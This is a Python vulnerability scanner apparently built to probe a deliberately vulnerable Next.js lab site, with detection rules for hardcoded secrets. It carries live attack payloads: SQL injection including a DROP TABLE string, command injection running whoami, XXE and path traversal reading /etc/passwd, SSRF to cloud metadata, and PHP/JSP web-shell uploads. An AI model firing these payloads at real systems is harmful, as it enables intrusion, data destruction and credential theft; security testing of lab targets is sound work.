#!/usr/bin/env python3
"""
Next.js Vulnerability Scanner for ATT4ck Surface
Targeted scanning for known vulnerable endpoints
"""

import re
import json
import requests
import urllib.parse
from typing import List, Dict, Optional, Any
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

console = Console()


class NextJSVulnScanner:
    """
    Targeted vulnerability scanner for Next.js applications
    Detects all vulnerabilities in the ATT4ck Surface test site
    """
    
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'ATT4ck-Surface-Scanner/2.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9'
        })
        self.findings = []
        self.verified_endpoints = set()
        self.console = Console()
        
        # Vulnerability signatures for detection
        self.signatures = {
            'sql_injection': [
                'SQL syntax', 'mysql_fetch', 'ORA-', 'PostgreSQL',
                'SQLite', 'Unclosed quotation mark', 'You have an error',
                'sql', 'database', 'query', 'SELECT', 'FROM', 'WHERE'
            ],
            'xss': [
                '<script>alert', 'onerror=alert', 'onload=alert',
                'javascript:alert', 'eval(', 'document.write'
            ],
            'ssti': [
                '49', '7777777', 'config', '__class__', '__mro__'
            ],
            'sensitive_data': [
                'password', 'secret', 'token', 'api_key', 'JWT'
            ],
            'idor': [
                'User', 'user', 'profile', 'email', 'password'
            ]
        }
    
    def scan_all(self) -> List[Dict]:
        """Run all vulnerability tests"""
        self.console.print(Panel(
            "[bold cyan]🎯 Next.js Vulnerability Scanner[/bold cyan]\n"
            f"Target: {self.base_url}\n"
            "Detecting all known vulnerabilities in the test site",
            width=80
        ))
        
        # Phase 1: Discover endpoints
        self._discover_endpoints()
        
        # Phase 2: Test each vulnerability
        self.console.print("\n[bold cyan]🔥 Running vulnerability tests...[/bold cyan]")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        ) as progress:
            tasks = [
                ("Testing Hardcoded Secrets", self.test_hardcoded_secrets),
                ("Testing XSS", self.test_xss),
                ("Testing SQL Injection", self.test_sql_injection),
                ("Testing SSTI", self.test_ssti),
                ("Testing XXE/GraphQL", self.test_graphql),
                ("Testing Command Injection", self.test_command_injection),
                ("Testing Open Redirect", self.test_open_redirect),
                ("Testing SSRF", self.test_ssrf),
                ("Testing Path Traversal", self.test_path_traversal),
                ("Testing IDOR", self.test_idor),
                ("Testing File Upload", self.test_file_upload),
                ("Testing CORS", self.test_cors),
                ("Testing JWT Weak Secret", self.test_jwt_weak_secret),
                ("Testing Admin Panel", self.test_admin_panel),
            ]
            
            main_task = progress.add_task("[cyan]Scanning...", total=len(tasks))
            
            for description, test_func in tasks:
                progress.update(main_task, description=description)
                test_func()
                progress.update(main_task, advance=1)
        
        return self.findings
    
    def _discover_endpoints(self):
        """Discover all Next.js endpoints"""
        self.console.print("[cyan]📋 Discovering endpoints...[/cyan]")
        
        endpoints = [
            '/api/graphql', '/api/users', '/api/webhook',
            '/admin', '/download', '/login', '/profile',
            '/search', '/upload', '/profile/1'
        ]
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {
                executor.submit(self._check_endpoint, endpoint): endpoint
                for endpoint in endpoints
            }
            
            for future in as_completed(futures):
                endpoint = futures[future]
                try:
                    if future.result():
                        self.verified_endpoints.add(endpoint)
                        self.console.print(f"  [green]✓[/green] {endpoint}")
                except Exception:
                    pass
        
        self.console.print(f"[dim]Found {len(self.verified_endpoints)} active endpoints[/dim]\n")
    
    def _check_endpoint(self, endpoint: str) -> bool:
        """Check if endpoint exists"""
        try:
            response = self.session.get(
                f"{self.base_url}{endpoint}",
                timeout=3,
                allow_redirects=False
            )
            return response.status_code in [200, 301, 302, 307, 308]
        except:
            return False
    
    def _add_finding(self, category: str, name: str, description: str,
                     severity: str, confidence: int, endpoint: str,
                     payload: str = "", evidence: str = "", 
                     cwe: str = "", remediation: str = ""):
        """Add finding to results"""
        finding = {
            "finding_id": f"{category[:4].upper()}-{len(self.findings):03d}",
            "category": category,
            "name": name,
            "description": description,
            "severity": severity,
            "confidence": confidence,
            "endpoint": endpoint,
            "payload": payload[:200] if payload else "",
            "evidence": evidence[:300] if evidence else "",
            "url": f"{self.base_url}{endpoint}",
            "cwe": cwe,
            "remediation": remediation,
            "timestamp": datetime.now().isoformat(),
            "owasp": self._get_owasp_mapping(category)
        }
        self.findings.append(finding)
        
        # Print immediately
        color = {'CRITICAL': 'red', 'HIGH': 'orange1', 'MEDIUM': 'yellow'}.get(severity, 'white')
        self.console.print(f"  [{color}]✗[/{color}] {name}")
        if payload:
            self.console.print(f"    [dim]Payload: {payload[:60]}[/dim]")
    
    def _get_owasp_mapping(self, category: str) -> str:
        """Get OWASP Top 10 mapping"""
        mapping = {
            "XSS": "A03:2021 - Injection",
            "SQL Injection": "A03:2021 - Injection",
            "SSTI": "A03:2021 - Injection",
            "Command Injection": "A03:2021 - Injection",
            "XXE": "A05:2021 - Security Misconfiguration",
            "IDOR": "A01:2021 - Broken Access Control",
            "Path Traversal": "A01:2021 - Broken Access Control",
            "File Upload": "A05:2021 - Security Misconfiguration",
            "CORS": "A05:2021 - Security Misconfiguration",
            "Hardcoded Secret": "A07:2021 - Identification and Authentication Failures",
            "JWT Weak Secret": "A07:2021 - Identification and Authentication Failures",
            "SSRF": "A10:2021 - Server-Side Request Forgery",
            "Open Redirect": "A04:2021 - Insecure Design",
            "No Authentication": "A01:2021 - Broken Access Control",
        }
        return mapping.get(category, "Unknown")
    
    def test_hardcoded_secrets(self):
        """Test for hardcoded secrets"""
        try:
            response = self.session.get(f"{self.base_url}/", timeout=5)
            html = response.text
            
            secrets = {
                'API_KEY': (r'API_KEY\s*=\s*["\']([^"\']+)["\']', 'CRITICAL'),
                'JWT_SECRET': (r'JWT_SECRET\s*=\s*["\']([^"\']+)["\']', 'CRITICAL'),
                'OpenAI Key': (r'sk-[a-zA-Z0-9]{20,}', 'CRITICAL'),
                'AWS Key': (r'AKIA[0-9A-Z]{16}', 'CRITICAL'),
                'JWT Token': (r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}', 'CRITICAL'),
                'Private Key': (r'BEGIN\s+(?:RSA|DSA|EC|OPENSSH)\s+PRIVATE\s+KEY', 'CRITICAL'),
                'Webhook Secret': (r'webhook_secret[_\s]*[:=][_\s]*["\']([^"\']+)["\']', 'CRITICAL'),
            }
            
            for name, (pattern, severity) in secrets.items():
                matches = re.findall(pattern, html, re.IGNORECASE)
                for match in matches:
                    self._add_finding(
                        category="Hardcoded Secret",
                        name=f"Hardcoded {name}",
                        description=f"Found {name}: {match[:30]}...",
                        severity=severity,
                        confidence=100,
                        endpoint="/",
                        payload=match,
                        cwe="CWE-798",
                        remediation="Move secrets to environment variables"
                    )
        except Exception as e:
            self.console.print(f"[dim]  ! Secret scan error: {e}[/dim]")
    
    def test_xss(self):
        """Test for all XSS variants"""
        xss_payloads = [
            ("<script>alert(1)</script>", "Basic Script"),
            ("<img src=x onerror=alert(1)>", "Image Event"),
            ("<svg onload=alert(1)>", "SVG Event"),
            ("javascript:alert(1)", "JavaScript URI"),
            ("'\"><script>alert(1)</script>", "Context Breakout"),
            ("<div onmouseover=alert(1)>hover</div>", "Mouse Event"),
        ]
        
        # Test Reflected XSS
        if '/search' in self.verified_endpoints:
            for payload, _ in xss_payloads[:3]:
                test_url = f"{self.base_url}/search?q={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    if payload in response.text:
                        self._add_finding(
                            category="XSS",
                            name="Reflected XSS",
                            description=f"XSS via search parameter",
                            severity="CRITICAL",
                            confidence=95,
                            endpoint="/search",
                            payload=payload,
                            evidence=response.text[:200],
                            cwe="CWE-79",
                            remediation="Sanitize user input, use proper encoding"
                        )
                        break
                except:
                    pass
        
        # Test DOM XSS
        dom_payloads = [
            "#<script>alert(1)</script>",
            "#<img src=x onerror=alert(1)>"
        ]
        for payload in dom_payloads[:1]:
            try:
                response = self.session.get(f"{self.base_url}/{payload}", timeout=5)
                if "alert(1)" in response.text:
                    self._add_finding(
                        category="XSS",
                        name="DOM XSS",
                        description="DOM-based XSS via URL fragment",
                        severity="CRITICAL",
                        confidence=85,
                        endpoint="/#",
                        payload=payload,
                        cwe="CWE-79",
                        remediation="Avoid document.write(), use safe DOM methods"
                    )
                    break
            except:
                pass
        
        # Test Login XSS
        if '/login' in self.verified_endpoints:
            try:
                response = self.session.post(
                    f"{self.base_url}/login",
                    data={'username': "<script>alert(1)</script>", 'password': 'test'},
                    timeout=5
                )
                if "<script>alert(1)</script>" in response.text:
                    self._add_finding(
                        category="XSS",
                        name="Stored XSS (Login)",
                        description="XSS in login response message",
                        severity="CRITICAL",
                        confidence=90,
                        endpoint="/login",
                        payload="<script>alert(1)</script>",
                        cwe="CWE-79",
                        remediation="HTML escape all user-provided data"
                    )
            except:
                pass
    
    def test_sql_injection(self):
        """Test for SQL Injection"""
        sqli_payloads = [
            ("' OR '1'='1", "Classic OR Injection"),
            ("' OR 1=1--", "Comment Injection"),
            ("' UNION SELECT NULL--", "Union Injection"),
            ("'; DROP TABLE users--", "Drop Table Injection"),
            ("admin' --", "Auth Bypass"),
        ]
        
        endpoints = ['/api/users', '/api/graphql', '/search', '/login']
        
        for endpoint in endpoints:
            if endpoint not in self.verified_endpoints:
                continue
            
            for payload, _ in sqli_payloads:
                test_url = f"{self.base_url}{endpoint}?id={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    
                    # Check for SQL errors
                    for signature in self.signatures['sql_injection']:
                        if signature.lower() in response.text.lower():
                            self._add_finding(
                                category="SQL Injection",
                                name=f"SQL Injection in {endpoint}",
                                description=f"SQL error: {signature}",
                                severity="CRITICAL",
                                confidence=95,
                                endpoint=endpoint,
                                payload=payload,
                                evidence=response.text[:200],
                                cwe="CWE-89",
                                remediation="Use parameterized queries, prepared statements"
                            )
                            break
                    
                    # Check for successful login bypass
                    if endpoint == '/login' and "Logged in as:" in response.text:
                        self._add_finding(
                            category="SQL Injection",
                            name="Auth Bypass via SQL Injection",
                            description=f"Login bypass with: {payload}",
                            severity="CRITICAL",
                            confidence=100,
                            endpoint=endpoint,
                            payload=payload,
                            evidence=response.text[:200],
                            cwe="CWE-89",
                            remediation="Use parameterized queries for authentication"
                        )
                        break
                except:
                    pass
    
    def test_ssti(self):
        """Test for Server-Side Template Injection"""
        if '/search' not in self.verified_endpoints:
            return
        
        ssti_payloads = [
            ("{{7*7}}", "Basic Math"),
            ("{{7*'7'}}", "String Multiplication"),
            ("{{config}}", "Config Access"),
            ("${7*7}", "Expression"),
            ("{{''.__class__.__mro__}}", "Object Access"),
        ]
        
        for payload, desc in ssti_payloads:
            test_url = f"{self.base_url}/search?q={urllib.parse.quote(payload)}"
            try:
                response = self.session.get(test_url, timeout=5)
                
                # Check for SSTI indicators
                if "49" in response.text or "7777777" in response.text:
                    self._add_finding(
                        category="SSTI",
                        name="Server-Side Template Injection",
                        description=f"Template injection with {desc}",
                        severity="CRITICAL",
                        confidence=90,
                        endpoint="/search",
                        payload=payload,
                        evidence=response.text[:200],
                        cwe="CWE-94",
                        remediation="Avoid eval(), use safe template engines"
                    )
                    break
            except:
                pass
    
    def test_graphql(self):
        """Test GraphQL endpoint"""
        if '/api/graphql' not in self.verified_endpoints:
            return
        
        graphql_payloads = [
            '{"query": "query { user(id: 1) { name password } }"}',
            '{"query": "query { user(id: 1\\\' OR \\\'1\\\'=\\\'1) { name } }"}',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'
        ]
        
        for payload in graphql_payloads[:1]:
            try:
                response = self.session.post(
                    f"{self.base_url}/api/graphql",
                    json=json.loads(payload) if payload.startswith('{') else {},
                    data=payload if payload.startswith('<?xml') else None,
                    headers={'Content-Type': 'application/json' if payload.startswith('{') else 'application/xml'},
                    timeout=5
                )
                
                if 'password' in response.text or 'password123' in response.text:
                    self._add_finding(
                        category="GraphQL",
                        name="GraphQL Data Exposure",
                        description="Sensitive data exposed via GraphQL",
                        severity="HIGH",
                        confidence=90,
                        endpoint="/api/graphql",
                        payload=payload,
                        evidence=response.text[:200],
                        cwe="CWE-200",
                        remediation="Implement proper authorization checks"
                    )
            except:
                pass
    
    def test_command_injection(self):
        """Test for Command Injection"""
        if '/api/webhook' not in self.verified_endpoints:
            return
        
        cmd_payloads = [
            ("; whoami", "Basic Command"),
            ("| whoami", "Pipe Command"),
            ("&& whoami", "AND Command"),
            ("$(whoami)", "Subshell"),
            ("`whoami`", "Backtick"),
        ]
        
        for payload, desc in cmd_payloads:
            test_url = f"{self.base_url}/api/webhook?url={urllib.parse.quote(payload)}"
            try:
                response = self.session.get(test_url, timeout=5)
                
                # Check for command output
                if any(x in response.text.lower() for x in ['uid=', 'gid=', 'root', 'admin', 'windows']):
                    self._add_finding(
                        category="Command Injection",
                        name=f"Command Injection ({desc})",
                        description=f"Command execution with: {payload}",
                        severity="CRITICAL",
                        confidence=90,
                        endpoint="/api/webhook",
                        payload=payload,
                        evidence=response.text[:200],
                        cwe="CWE-78",
                        remediation="Never use user input in system commands"
                    )
                    break
            except:
                pass
    
    def test_open_redirect(self):
        """Test for Open Redirect"""
        redirect_endpoints = ['/api/webhook', '/login']
        
        for endpoint in redirect_endpoints:
            if endpoint not in self.verified_endpoints:
                continue
            
            redirect_payloads = [
                "//attacker.com",
                "https://attacker.com",
                "http://attacker.com",
                "//attacker.com%2f%2fexample.com",
            ]
            
            for payload in redirect_payloads:
                test_url = f"{self.base_url}{endpoint}?redirect={urllib.parse.quote(payload)}"
                try:
                    response = self.session.get(test_url, timeout=5, allow_redirects=False)
                    if response.status_code in [301, 302, 307, 308]:
                        location = response.headers.get('Location', '')
                        if 'attacker.com' in location:
                            self._add_finding(
                                category="Open Redirect",
                                name="Open Redirect",
                                description=f"Redirects to attacker.com",
                                severity="MEDIUM",
                                confidence=90,
                                endpoint=endpoint,
                                payload=payload,
                                cwe="CWE-601",
                                remediation="Validate redirect URLs against whitelist"
                            )
                            break
                except:
                    pass
    
    def test_ssrf(self):
        """Test for SSRF"""
        if '/api/users' not in self.verified_endpoints:
            return
        
        ssrf_targets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://127.0.0.1:8080/admin",
            "http://localhost:3000/api/users",
            "file:///etc/passwd",
            "http://metadata.google.internal/computeMetadata/v1/"
        ]
        
        for target in ssrf_targets:
            test_url = f"{self.base_url}/api/users?url={urllib.parse.quote(target)}"
            try:
                response = self.session.get(test_url, timeout=5)
                if response.status_code == 200 and len(response.text) > 50:
                    self._add_finding(
                        category="SSRF",
                        name="Server-Side Request Forgery",
                        description=f"SSRF to internal resource: {target}",
                        severity="HIGH",
                        confidence=85,
                        endpoint="/api/users",
                        payload=target,
                        evidence=response.text[:200],
                        cwe="CWE-918",
                        remediation="Validate and sanitize URLs, use allowlist"
                    )
                    break
            except:
                pass
    
    def test_path_traversal(self):
        """Test for Path Traversal"""
        if '/download' not in self.verified_endpoints:
            return
        
        traversal_payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/passwd%00",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd"
        ]
        
        for payload in traversal_payloads:
            test_url = f"{self.base_url}/download?file={urllib.parse.quote(payload)}"
            try:
                response = self.session.get(test_url, timeout=5)
                if "root:" in response.text or "Windows" in response.text:
                    self._add_finding(
                        category="Path Traversal",
                        name="Path Traversal",
                        description=f"File access: {payload}",
                        severity="HIGH",
                        confidence=90,
                        endpoint="/download",
                        payload=payload,
                        evidence=response.text[:200],
                        cwe="CWE-22",
                        remediation="Sanitize file paths, use allowlist"
                    )
                    break
            except:
                pass
    
    def test_idor(self):
        """Test for IDOR"""
        idor_endpoints = ['/api/users', '/profile', '/profile/[id]']
        
        for endpoint in idor_endpoints:
            if endpoint not in self.verified_endpoints:
                continue
            
            for user_id in [1, 2, 3, 4, 5, 100, 'admin']:
                test_url = f"{self.base_url}{endpoint.replace('[id]', str(user_id))}?id={user_id}"
                try:
                    response = self.session.get(test_url, timeout=5)
                    if response.status_code == 200:
                        if any(x in response.text.lower() for x in ['user', 'profile', 'email', 'password']):
                            self._add_finding(
                                category="IDOR",
                                name=f"IDOR in {endpoint}",
                                description=f"Access to resource ID: {user_id}",
                                severity="HIGH",
                                confidence=85,
                                endpoint=endpoint,
                                payload=str(user_id),
                                evidence=response.text[:200],
                                cwe="CWE-639",
                                remediation="Implement proper authorization checks"
                            )
                            break
                except:
                    pass
    
    def test_file_upload(self):
        """Test for File Upload"""
        if '/upload' not in self.verified_endpoints:
            return
        
        test_files = [
            ('test.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('test.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'text/plain'),
            ('test.html', '<script>alert(1)</script>', 'text/html'),
            ('test.svg', '<svg onload="alert(1)"></svg>', 'image/svg+xml')
        ]
        
        for filename, content, mime in test_files:
            try:
                files = {'file': (filename, content, mime)}
                response = self.session.post(
                    f"{self.base_url}/upload",
                    files=files,
                    timeout=5
                )
                
                if "uploaded" in response.text.lower() or "success" in response.text.lower():
                    self._add_finding(
                        category="File Upload",
                        name=f"Unrestricted File Upload",
                        description=f"Uploaded executable file: {filename}",
                        severity="HIGH",
                        confidence=85,
                        endpoint="/upload",
                        payload=filename,
                        cwe="CWE-434",
                        remediation="Validate file types, use secure storage"
                    )
                    break
            except:
                pass
    
    def test_cors(self):
        """Test for CORS Misconfiguration"""
        cors_endpoints = ['/api/users', '/api/profile', '/api/webhook']
        
        for endpoint in cors_endpoints:
            if endpoint not in self.verified_endpoints:
                continue
            
            try:
                headers = {
                    'Origin': 'https://attacker.com',
                    'Access-Control-Request-Method': 'GET'
                }
                response = self.session.options(
                    f"{self.base_url}{endpoint}",
                    headers=headers,
                    timeout=5
                )
                
                origin = response.headers.get('Access-Control-Allow-Origin', '')
                if origin == '*':
                    self._add_finding(
                        category="CORS Misconfiguration",
                        name="Wildcard CORS",
                        description=f"CORS allows any origin on {endpoint}",
                        severity="MEDIUM",
                        confidence=95,
                        endpoint=endpoint,
                        payload="*",
                        cwe="CWE-942",
                        remediation="Restrict CORS to trusted origins"
                    )
                    break
            except:
                pass
    
    def test_jwt_weak_secret(self):
        """Test for JWT with weak secret"""
        try:
            response = self.session.get(f"{self.base_url}/api/users", timeout=5)
            jwt_pattern = r'eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]{10,}'
            matches = re.findall(jwt_pattern, response.text)
            
            if matches:
                self._add_finding(
                    category="JWT Weak Secret",
                    name="JWT with Weak Secret",
                    description=f"JWT token found: {matches[0][:20]}...",
                    severity="CRITICAL",
                    confidence=90,
                    endpoint="/api/users",
                    payload=matches[0][:50],
                    cwe="CWE-312",
                    remediation="Use strong secrets, rotate regularly"
                )
        except:
            pass
    
    def test_admin_panel(self):
        """Test for unprotected admin panel"""
        if '/admin' not in self.verified_endpoints:
            return
        
        try:
            response = self.session.get(f"{self.base_url}/admin", timeout=5)
            if "Admin Panel" in response.text or "Dashboard" in response.text:
                self._add_finding(
                    category="No Authentication",
                    name="Unprotected Admin Panel",
                    description="Admin panel accessible without authentication",
                    severity="CRITICAL",
                    confidence=100,
                    endpoint="/admin",
                    evidence=response.text[:200],
                    cwe="CWE-306",
                    remediation="Implement authentication and authorization"
                )
        except:
            pass
    
    def render_results(self):
        """Render all findings in a table"""
        if not self.findings:
            self.console.print("\n[green]✅ No vulnerabilities found![/green]")
            return
        
        self.console.print(f"\n[bold red]🔥 Vulnerabilities Found: {len(self.findings)}[/bold red]\n")
        
        # Summary by severity
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for f in self.findings:
            sev = f.get('severity', 'MEDIUM')
            if sev in severity_counts:
                severity_counts[sev] += 1
        
        summary = Table(title="Severity Summary", show_header=True)
        summary.add_column("Severity", style="bold")
        summary.add_column("Count", justify="right")
        
        for sev, count in severity_counts.items():
            if count > 0:
                color = {'CRITICAL': 'red', 'HIGH': 'orange1', 'MEDIUM': 'yellow'}.get(sev, 'white')
                summary.add_row(f'[{color}]{sev}[/{color}]', str(count))
        self.console.print(summary)
        
        # Detailed findings
        self.console.print("\n[bold]📋 Detailed Findings[/bold]\n")
        
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("#", width=4)
        table.add_column("Category", width=25)
        table.add_column("Vulnerability", width=30)
        table.add_column("Severity", width=12)
        table.add_column("Endpoint", width=20)
        
        for i, f in enumerate(self.findings, 1):
            severity = f.get('severity', 'MEDIUM')
            color = {'CRITICAL': 'red', 'HIGH': 'orange1', 'MEDIUM': 'yellow'}.get(severity, 'white')
            table.add_row(
                str(i),
                f.get('category', 'Unknown')[:23],
                f.get('name', '')[:28],
                f'[{color}]{severity}[/{color}]',
                f.get('endpoint', '')[:18]
            )
        
        self.console.print(table)
        
        # Export
        self._export_results()
    
    def _export_results(self):
        """Export findings to JSON"""
        import os
        os.makedirs('output', exist_ok=True)
        
        output = {
            'metadata': {
                'target': self.base_url,
                'timestamp': datetime.now().isoformat(),
                'total_findings': len(self.findings),
                'scanner': 'ATT4ck Surface Next.js Scanner'
            },
            'findings': self.findings
        }
        
        with open('output/nextjs_vulnerabilities.json', 'w') as f:
            json.dump(output, f, indent=2)
        
        self.console.print(f"\n[green]✅ Results saved to output/nextjs_vulnerabilities.json[/green]")


def scan_nextjs(target_url: str) -> List[Dict]:
    """Main entry point for Next.js scanning"""
    scanner = NextJSVulnScanner(target_url)
    findings = scanner.scan_all()
    scanner.render_results()
    return findings


# Legacy compatibility
def scan(target_url: str) -> List[Dict]:
    """Legacy function for compatibility"""
    return scan_nextjs(target_url)


if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "https://vulnerable-site-liart.vercel.app"
    scan_nextjs(target)